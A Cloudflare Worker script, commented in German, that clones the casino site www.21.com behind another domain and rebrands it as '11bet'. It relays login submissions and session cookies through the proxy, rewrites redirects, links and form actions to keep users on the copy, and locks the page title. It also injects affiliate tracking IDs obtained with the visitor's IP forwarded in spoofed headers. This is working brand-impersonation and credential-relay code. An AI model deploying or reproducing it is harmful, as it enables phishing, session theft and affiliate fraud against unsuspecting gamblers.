export default {
  async fetch(request) {
    const url = new URL(request.url);
    const targetBase = "https://www.21.com";

    // =========================================================================
    // 1. KONFIGURATION (Bleibt alles exakt wie bei dir)
    // =========================================================================
    const affiliateTrackerUrl = "https://prod.trk21.com/click?offer=FF5GG2YAJ0P0&uid=CVuo3XCJ";
    
    const newLogoUrl = "https://cdn.phototourl.com/member/2026-10-09-e328e6ac-8adb-4699-97f1-35ca1f9f17ac.png"; 
    const customFaviconUrl = "https://cdn.phototourl.com/member/2026-10-09-e328e6ac-8adb-4699-97f1-35ca1f9f17ac.png"; 

    const customTabTitle = "11bet - Bestes online Casino inkl. Sportwetten"; 

    const textReplacements = {
      "21.com": "11bet",
      "21": "11bet",
      "21-Casino": "11bet"
    };
    // =========================================================================

    const isStaticFile = url.pathname.match(/\.(png|jpg|jpeg|gif|svg|css|js|woff|woff2|ttf|eot|ico|json)$/i);
    if (isStaticFile) {
      const fetchUrl = new URL(url.pathname + url.search, targetBase);
      return fetch(fetchUrl, {
        headers: { "Host": "www.21.com", "User-Agent": request.headers.get("User-Agent") || "" }
      });
    }

    const cookieHeader = request.headers.get("Cookie") || "";
    const cookies = Object.fromEntries(cookieHeader.split(';').map(c => {
      const [k, v] = c.trim().split('=');
      return [k, v];
    }));

    let affiliateId = url.searchParams.get("affiliateId") || cookies["aff_affiliateId"];
    let trackerId = url.searchParams.get("trackerId") || cookies["aff_trackerId"];

    if (!trackerId) {
      try {
        const trackerResponse = await fetch(affiliateTrackerUrl, {
          method: "GET",
          headers: {
            "User-Agent": request.headers.get("User-Agent") || "",
            "X-Forwarded-For": request.headers.get("CF-Connecting-IP") || "",
            "CF-Connecting-IP": request.headers.get("CF-Connecting-IP") || ""
          },
          redirect: "manual"
        });

        const locationHeader = trackerResponse.headers.get("Location");
        if (locationHeader) {
          const redirectTarget = new URL(locationHeader);
          affiliateId = redirectTarget.searchParams.get("affiliateId");
          trackerId = redirectTarget.searchParams.get("trackerId");
        }
      } catch (e) {
        console.error("Tracker Fetch Fehler:", e);
      }
    }

    if (trackerId && !url.searchParams.has("trackerId")) {
      url.searchParams.set("trackerId", trackerId);
      if (affiliateId) url.searchParams.set("affiliateId", affiliateId);
      return Response.redirect(url.toString(), 302);
    }

    const fetchUrl = new URL(url.pathname + url.search, targetBase);
    const proxyHeaders = new Headers(request.headers);
    proxyHeaders.set("Host", "www.21.com");
    proxyHeaders.set("Referer", "https://www.21.com/");
    if (request.headers.get("Origin")) {
      proxyHeaders.set("Origin", "https://www.21.com");
    }

    // WICHTIG: Die Methode und den Body mitnehmen, damit Login-Daten gesendet werden!
    const fetchOptions = {
      method: request.method,
      headers: proxyHeaders,
      redirect: "manual" // Wir fangen Umleitungen manuell ab!
    };

    // Wenn es ein POST Request ist (z.B. Login absenden), müssen die Daten mit!
    if (["POST", "PUT", "PATCH"].includes(request.method.toUpperCase())) {
      fetchOptions.body = request.body;
    }

    const response = await fetch(fetchUrl, fetchOptions);

    const newHeaders = new Headers(response.headers);

    // 1. VERHINDERN DASS COOKIES ABGELEHNT WERDEN
    const rawCookies = response.headers.getSetCookie ? response.headers.getSetCookie() : [];
    if (rawCookies.length > 0) {
      newHeaders.delete("Set-Cookie");
      for (let cookie of rawCookies) {
        newHeaders.append("Set-Cookie", cookie.replace(/Domain=[^;]+;?/gi, ''));
      }
    }

    // 2. VERHINDERN DASS DU AUF DIE ECHTE SEITE UMGELEITET WIRST (Der Fix für dein Problem!)
    const location = newHeaders.get("Location");
    if (location) {
      // Ersetzt "https://www.21.com" mit deiner eigenen Domain
      const rewrittenLocation = location.replace(/https?:\/\/(www\.)?21\.com/i, url.origin);
      newHeaders.set("Location", rewrittenLocation);
    }

    if (trackerId) {
      newHeaders.append("Set-Cookie", `aff_trackerId=${trackerId}; Path=/; Max-Age=2592000; SameSite=Lax`);
    }
    if (affiliateId) {
      newHeaders.append("Set-Cookie", `aff_affiliateId=${affiliateId}; Path=/; Max-Age=2592000; SameSite=Lax`);
    }

    const contentType = response.headers.get("content-type") || "";

    if (contentType.includes("text/html")) {
      let newResponse = new HTMLRewriter()
        // Wir fügen auch eine Regel hinzu, die absolute Links im HTML überschreibt
        .on("a", {
          element(el) {
            const href = el.getAttribute("href");
            if (href && href.includes("21.com")) {
              el.setAttribute("href", href.replace(/https?:\/\/(www\.)?21\.com/g, url.origin));
            }
          }
        })
        .on("form", {
          element(el) {
            const action = el.getAttribute("action");
            if (action && action.includes("21.com")) {
              el.setAttribute("action", action.replace(/https?:\/\/(www\.)?21\.com/g, url.origin));
            }
          }
        })
        .on("head", {
          element(el) {
            el.append(`
              <style>
                img[src*="logo"], img[alt*="21.com"], img[aria-label*="21.com"] {
                  content: url("${newLogoUrl}") !important;
                }
              </style>
              <script>
                (function() {
                  const affId = "${affiliateId || ''}";
                  const trkId = "${trackerId || ''}";
                  const newTitle = "${customTabTitle}";
                  const newFavicon = "${customFaviconUrl}";
                  const replacements = ${JSON.stringify(textReplacements)};

                  if (newTitle) {
                    document.title = newTitle;
                    try {
                      Object.defineProperty(document, 'title', {
                        get: function() { return newTitle; },
                        set: function() { /* Ignorieren */ }
                      });
                    } catch(e) {}
                  }

                  function enforceFavicon() {
                    if (!newFavicon) return;
                    let icons = document.querySelectorAll("link[rel*='icon'], link[rel='shortcut icon']");
                    if (icons.length === 0) {
                      let link = document.createElement('link');
                      link.rel = 'icon';
                      link.href = newFavicon;
                      document.head.appendChild(link);
                    } else {
                      icons.forEach(icon => {
                        if (icon.href !== newFavicon) icon.href = newFavicon;
                      });
                    }
                  }

                  function replaceTextNodes(node) {
                    if (node.nodeType === Node.TEXT_NODE) {
                      let val = node.nodeValue;
                      let changed = false;
                      for (const [search, replace] of Object.entries(replacements)) {
                        if (search && val.includes(search)) {
                          val = val.split(search).join(replace);
                          changed = true;
                        }
                      }
                      if (changed) node.nodeValue = val;
                    } else {
                      for (const child of node.childNodes) {
                        if (child.nodeName !== 'SCRIPT' && child.nodeName !== 'STYLE') {
                          replaceTextNodes(child);
                        }
                      }
                    }
                  }

                  document.addEventListener("DOMContentLoaded", function() {
                    enforceFavicon();
                    replaceTextNodes(document.body);

                    const headObserver = new MutationObserver(() => {
                      if (newTitle) {
                        const titleTag = document.querySelector("title");
                        if (titleTag && titleTag.innerText !== newTitle) {
                          titleTag.innerText = newTitle;
                        }
                      }
                      enforceFavicon();
                    });
                    if (document.head) {
                      headObserver.observe(document.head, { childList: true, subtree: true, characterData: true });
                    }

                    const bodyObserver = new MutationObserver((mutations) => {
                      mutations.forEach((mutation) => {
                        mutation.addedNodes.forEach((node) => replaceTextNodes(node));
                      });
                    });
                    if (document.body) {
                      bodyObserver.observe(document.body, { childList: true, subtree: true });
                    }

                    if (affId && trkId) {
                      document.addEventListener("click", function(e) {
                        const a = e.target.closest("a");
                        if (a && a.href && a.href.startsWith(window.location.origin)) {
                          try {
                            const linkUrl = new URL(a.href);
                            if (!linkUrl.searchParams.has("trackerId")) {
                              linkUrl.searchParams.set("trackerId", trkId);
                              linkUrl.searchParams.set("affiliateId", affId);
                              a.href = linkUrl.toString();
                            }
                          } catch(err) {}
                        }
                      }, true);
                    }
                  });
                })();
              </script>
            `, { html: true });
          }
        })
        .transform(response);

      return new Response(newResponse.body, {
        status: newResponse.status,
        statusText: newResponse.statusText,
        headers: newHeaders
      });
    }

    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders
    });
  }
};
